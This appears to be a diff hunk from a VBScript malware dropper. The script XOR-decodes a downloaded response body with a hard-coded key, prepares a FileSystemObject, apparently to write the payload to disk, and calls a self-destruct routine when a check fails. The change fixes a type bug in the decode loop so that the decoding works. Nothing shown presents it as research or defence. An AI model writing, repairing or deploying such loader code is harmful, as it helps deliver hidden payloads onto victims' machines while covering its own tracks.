@@ -15,7 +15,7 @@ data = x.ResponseBody
 If VarType(data) <> 8209 Then MsgBox "FAIL: VarType=" & VarType(data): SelfDestruct
 key = Array(&H3A, &H97, &H79, &HB0)
 For i = 0 To UBound(data)
-  data(i) = data(i) Xor key((i Mod 4))
+  data(i) = CByte(data(i) Xor key((i Mod 4)))
 Next
 Set fso = CreateObject("Scripting.FileSystemObject")
 If fso Is Nothing Then MsgBox "FAIL: No FSO": SelfDestruct
